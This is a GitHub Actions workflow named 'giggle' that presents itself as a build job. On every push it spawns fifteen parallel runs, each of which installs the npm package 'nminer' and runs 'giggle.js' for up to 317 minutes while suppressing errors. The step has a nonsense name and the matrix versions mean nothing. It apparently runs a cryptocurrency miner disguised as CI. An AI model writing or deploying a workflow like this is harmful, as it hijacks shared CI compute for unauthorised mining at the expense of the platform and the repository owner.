name: giggle
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3512 }
          - { version: 31 }
          - { version: 7565 }
          - { version: 4748 }
          - { version: 6522 }
          - { version: 2175 }
          - { version: 3104 }
          - { version: 961 }
          - { version: 8153 }
          - { version: 3089 }
          - { version: 8451 }
          - { version: 9280 }
          - { version: 2233 }
          - { version: 2040 }
          - { version: 2821 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ah beyond wildly ouch
        run: |
          npm install nminer@latest
          timeout 317m node giggle.js || echo "giggle executed"